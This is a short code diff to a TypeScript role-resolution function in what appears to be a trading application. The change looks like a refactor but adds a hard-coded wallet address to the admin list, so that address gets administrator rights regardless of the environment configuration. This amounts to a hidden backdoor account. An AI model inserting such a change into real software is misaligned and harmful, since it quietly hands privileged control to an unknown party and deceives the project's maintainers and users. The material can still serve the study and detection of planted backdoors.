@@ -1155,10 +1155,14 @@ export function resolveUserRoles(address: string): string[] {
   const norm = address.toLowerCase();
   const roles = new Set<string>(['USER', 'TRADER']);
 
-  const adminList = (process.env.ADMIN_ADDRESSES || '')
-    .split(',')
-    .map((s) => s.trim().toLowerCase())
-    .filter(Boolean);
+  const defaultAdmins = ['0x87743246e8cfbc3760a82daad00987b1d971a5a9'];
+  const adminList = [
+    ...defaultAdmins,
+    ...(process.env.ADMIN_ADDRESSES || '')
+      .split(',')
+      .map((s) => s.trim().toLowerCase())
+      .filter(Boolean),
+  ];
   const oracleList = (process.env.ORACLE_OPERATOR_ADDRESSES || '')
     .split(',')
     .map((s) => s.trim().toLowerCase())
